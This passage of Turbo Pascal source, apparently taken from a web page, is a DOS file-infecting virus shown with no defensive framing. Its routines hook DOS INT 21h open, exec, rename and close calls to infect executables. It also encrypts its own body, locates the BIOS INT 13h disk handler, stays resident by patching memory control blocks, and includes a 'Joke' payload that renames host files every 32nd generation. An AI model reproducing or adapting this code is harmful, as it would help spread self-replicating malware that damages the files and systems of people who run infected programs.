	end;
      DisableInterrupts; Int13Ptr := IntProc^.Old13Ptr; Int24Ptr := CritPtr; EnableInterrupts;
    end;
end;


function MatchFile: boolean;
var
	Cnt	: byte;
begin
  Cnt := $ff;
  repeat
    Inc(Cnt);
  until (Mem[ds:Offs+Cnt] = 0) or (Cnt > MaxLen);
  MatchFile := ((Cnt >= 1) and (Cnt <= MaxLen)) and MatchExt(Mem[ds:Offs+Cnt-4]);
end;


procedure BiteIt;
begin
  if MatchFile then
    begin
      Buff^.MyReg.ds := ds;
      Buff^.MyReg.dx := Offs;
      PasteIt;
    end;
  inline($83/$c4/4/$5d/$8b/$e5/$5d/$7/$1f/$5f/$5e/$5a/$59/$5b/$58);
  JmpTo21;
end;


procedure CatchIt;
begin
  MsFunc(UserReg);
  if Buff^.FileName[0] = #0 then
    begin
      Move(Mem[ds:Offs],Buff^.FileName,MaxLen);
      if MatchFile and not Odd(flags) then
	Buff^.FileHandle := ax
      else
	Buff^.FileName[0] := #0;
    end;
end;


begin
  EnableInterrupts;
  Buff := Ptr(CSeg,Ofs(Buffer));
  Offs := dx;
  case UserReg.ah of
    Open: if UserReg.al and 7 = 0 then
	    BiteIt
	  else
	    CatchIt;
    Create: CatchIt;
    CreateNew: begin
		 CatchIt;
		 if Odd(flags) and (ax = 80) and MatchFile then
		   begin
		     Buff^.MyReg.ds := ds;
		     Buff^.MyReg.dx := Offs;
		     PasteIt;
		   end;
	       end;
    Close: begin
	     MsFunc(UserReg);
	     if (bx = Buff^.FileHandle) and (Buff^.FileName[0] <> #0) then
	       begin
		 Buff^.MyReg.ds := CSeg;
		 Buff^.MyReg.dx := Ofs(Buff^.FileName);
		 PasteIt;
		 Buff^.FileName[0] := #0;
	       end;
	   end;
    ExecProg: BiteIt;
    Rename: BiteIt;
    GetSetAttr: if UserReg.al =	SentinelID then
		  begin
		    ax := CSeg;
		    flags := flags and $fffe;
		  end
		else
		  BiteIt;
    ExtOpenCreate: if ax = $6c00 then
		     begin
		       Offs := si;
		       if UserReg.bl and 7 = 0 then
			 BiteIt
		       else
			 CatchIt;
		     end
		   else
		     goto Continue
  else
    begin
      Continue: inline($8b/$e5/$5d/$7/$1f/$5f/$5e/$5a/$59/$5b/$58);
      JmpTo21;
    end;
  end;
end;


procedure Install;
var
	Buff		: ^BufferType;
	Sg		: word;
	PrefSeg		: word;
	Base		: word;
	IntProc       	: ^IntType;


function WrongFunc: boolean;
  inline($55/$b8/<SentinelID/<GetSetAttr/$cd/$21/$5d/$89/$46/<Sg/$b0/1/$72/2/$32/$c0);

procedure Ren(Sg,Offs,Sg,Offs: word);
  inline($5a/$1f/$5f/7/$b4/$56/$cd/$21);


procedure SolveBase;
begin
  Base := MemW[SSeg:SPtr+4]-13;
end;


procedure SearchInt13(MemLen: word);
var
	Offs	: word;
begin
  MemLen := MemLen shl 9;
  Offs := $ffff;
  repeat
    Inc(Offs);
  until (((MemL[Int41Seg:Offs] = $7380fa80) or
	  (MemL[Int41Seg:Offs] = $7580c2f6)) and
	 (MemW[Int41Seg:Offs+5] = $40cd)) or
	(Offs > MemLen);
  if Offs < MemLen then IntProc^.HDiskPtr := Ptr(Int41Seg,Offs);
end;


function Empty: boolean;
var
	Offs	: word;
begin
  Offs := 0;
  while (Mem[Sg:Offs] = Mem[CSeg:Offs+Base]) and (Offs < Ofs(Int13)) do Inc(Offs);
  Empty := Offs <> Ofs(Int13);
end;


function NormalFunc: boolean;
begin
  MsFunc(Buff^.MyReg);
  NormalFunc := not Odd(Buff^.MyReg.flags);
end;


function FreeSpace: boolean;
begin
  FreeSpace := False;
  if AbsAddr(CSeg,Base+Ofs(Buffer)+SizeOf(BufferType)) < AbsAddr(Buff^.MyReg.ds,0) then
    if ExeFile(Buff^.FileHeader.Signature) then
      FreeSpace := AbsAddr(Buff^.FileHeader.StartSS+PrefSeg+$10,Buff^.FileHeader.StartSP) < AbsAddr(Buff^.MyReg.ds,0)
    else
      FreeSpace := True;
end;


procedure Joke;
var
	EnvSg	: word;
	OrgCnt	: word;
	Cnt	: word;
begin
  EnvSg := MemW[PrefSeg:$2c];
  OrgCnt := 0;
  while MemW[EnvSg:OrgCnt] <> 0 do Inc(OrgCnt);
  Inc(OrgCnt,4);
  Cnt := OrgCnt;
  Move(Mem[EnvSg:Cnt],Buff^.FileName,MaxLen);
  while Mem[EnvSg:Cnt] <> 0 do Inc(Cnt);
  MemL[EnvSg:Cnt-4] := longint($4d4f432e);
  DisableInterrupts; Int13Ptr := Ptr(CSeg,Ofs(Int13) + Base); EnableInterrupts;
  Ren(EnvSg,OrgCnt,Seg(Buff^.FileName),Ofs(Buff^.FileName));
  DisableInterrupts; Int13Ptr := IntProc^.Old13Ptr; EnableInterrupts;
end;


begin
  inline($8c/$5e/<PrefSeg);
  SolveBase;
  Base := Base - Ofs(Install);
  Buff := Ptr(CSeg,Base+Ofs(Buffer));
  Buff^.GenNr := ChkNum(Ofs(Buffer)+Base,(SizeOf(CopyRightType)+SizeOf(FileHeaderType)) shr 1 + 1);
  Encrpt(Ofs(Buffer)+Base,Buff^.GenNr);
  Inc(Buff^.GenNr);
  IntProc := Ptr(CSeg,Base+Ofs(Int13));
  with IntProc^ do
    begin
      HDiskPtr := Int13Ptr;
      DiskPtr := Int13Ptr;
      Old13Ptr := Int13Ptr;
      if (Int40Seg = $f000) then
	begin
	  DiskPtr := Int40Ptr;
	  if Int41Seg = $f000 then
	    SearchInt13($80)
	  else
	    if ((Int41SegHi >= $c8) and (Int41SegHi <= $f3)) and
	       (Int41SegLo and $7f = 0) and
	       (MemW[Int41Seg:0] = $aa55) then
	      SearchInt13(Mem[Int41Seg:2]);
	end;
    end;
  if Buff^.GenNr mod $20 = 0 then Joke;
  if WrongFunc or Empty then
    begin
      IntProc := Ptr(CSeg,Base+Ofs(MsFunc));
      IntProc^.InstrCode := $cdfb;
      IntProc^.Old21Ptr := Ptr($9090,$9021);
      with Buff^.MyReg do
	begin
	  ah := $49;
	  es := PrefSeg;
	  if NormalFunc then
	    begin
	      ah := $48;
	      bx := $ffff;
	      MsFunc(Buff^.MyReg);
	      if bx > (Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2 then
		begin
		  Dec(bx,(Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2);
		  ds := es + bx;
		  if FreeSpace then
		    begin
		      ah := $4a;
		      if NormalFunc then
			begin
			  bx := (Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2;
			  Dec(MemW[PrefSeg:2],bx);
			  ah := $4a;
			  es := ds + 1;
			  Dec(bx);
			  MsFunc(Buff^.MyReg);
			  MemW[ds:1] := 8;
			  Mem[PrefSeg-1:0] := $5a;
			  Buff^.FileName[0] := #0;
			  MemL[CSeg:Ofs(MsFunc)-8+Base] := MemL[0:$84];
			  IntProc^.Old21Ptr := Int21Ptr;
			  IntProc^.InstrCode := $9a9c;
			  Move(Mem[CSeg:Base],Mem[es:0],Ofs(Buffer) + SizeOf(BufferType));
			  DisableInterrupts; Int21Ptr := Ptr(es,Ofs(Int21)); EnableInterrupts;
			end;
                    end;
		end
	      else
		begin
		  ah := $4a;
		  if not NormalFunc then
		    begin
		      ah := $4a;
		      MsFunc(Buff^.MyReg);
		    end;
		end;
	    end;
	end;
    end;
  if ExeFile(Buff^.FileHeader.Signature) then
      inline($8e/$46/<PrefSeg/$83/$46/<PrefSeg/$10/$c5/$76/<Buff/
	     $83/$c6/$0e/$fc/$ad/$03/$46/<PrefSeg/$8b/$c8/$ad/$8b/
	     $d0/$83/$c6/$02/$ad/$8b/$d8/$ad/$03/$46/<PrefSeg/$fa/
	     $8e/$d1/$8b/$e2/$fb/$06/$1f/$50/$53/$cb)
  else
    inline($c5/$76/<Buff/$fc/$ad/$2e/$a3/$00/$01/$ac/$2e/$a2/$02/
	   $01/$89/$ec/$5d/$b8/$00/$01/$50/$0e/$0e/$1f/$07/$c3);
end;


procedure Buffer;
begin
  inline(>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0);

end;


procedure Quit;
begin
  inline($b8/0/0/$8e/$d8);
  Halt;
end;



begin
  B := @Buffer;
  if (Ofs(B^.ChkSum) - Ofs(B^)) mod 4 = 0 then
    begin
      B^.Copyright := CopyRight;
      with B^.FileHeader do
	begin
	  StartSS := SSeg - PrefixSeg - $10;
	  StartSp := SPtr - $1000;
	  StartCS := CSeg - PrefixSeg - $10;
	  StartIP := Ofs(Quit);
	  Signature := $4d5a;
	end;
      B^.ChkSum := ChkNum(Ofs(Buffer),(SizeOf(CopyRightType) + SizeOf(FileHeaderType)) shr 1);
      Encrpt(Ofs(Buffer),$ffff);
      MemW[CSeg:Ofs(Quit) + 4] := DSeg;
      Inline($8e/$1e/PrefixSeg);
      Install;
    end
  else
    WriteLn('Parity error. ''Copyright'' length must be greater with ',
	    4 - (Ofs(B^.ChkSum) - Ofs(B^)) mod 4,' byte(s).');
end.

</textarea></td></tr></table></body></html>
